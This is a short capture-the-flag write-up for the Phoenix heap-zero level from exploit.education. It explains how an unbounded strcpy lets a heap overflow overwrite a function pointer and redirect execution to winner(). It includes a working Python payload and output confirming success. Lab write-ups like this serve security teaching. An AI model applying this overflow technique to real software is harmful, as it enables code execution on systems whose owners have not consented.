# Heap 0

Write-up for: [https://exploit.education/phoenix/heap-zero/](https://exploit.education/phoenix/heap-zero/).

## Solution

The goal is to redirect execution to the winner() function. This could be achieved by overwriting
the `fp` function pointer of `f`. `f` is located after `d` on the heap. `d` is filled using `strcpy`
without bounds checking. This means we can overflow the `name` field of `d` in order to overwrite
`f->fp`. Note that this will also overwrite control data of `f` which will probably make any call
to `free` crash later on.

Since there is no memory protection (like ASLR), we can simply find out the address of the `winner`
function using objdump:

```
user@phoenix-amd64:/opt/phoenix/i486$ objdump -d heap-zero | grep winner
08048835 <winner>:
```

Now we need the offset of `f->fp` from `d->name` which we can write arbitrary data to.
Given the informative output of the program we can easily deduct the offset by probing
the executable (e.g. using binary search or using a unique pattern). Alternatively,
by looking at the source, we know that the `data` struct uses 64 bytes of memory, followed
by 8 bytes of heap control structure for `f` (prev_size, size). This means the function pointer we want to overwrite
is located 72 bytes after `d->name`. This results in the following exploit:

```
./heap-zero `python -c 'print "A"*72 + "\x08\x04\x88\x35"[::-1]' `
user@phoenix-amd64:/opt/phoenix/i486$ ./heap-zero `python -c 'print "A"*72 + "\x08\x04\x88\x35"[::-1]' `
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x8048835
Congratulations, you have passed this level
```

Note that `[::-1]` reverses a string in Python.
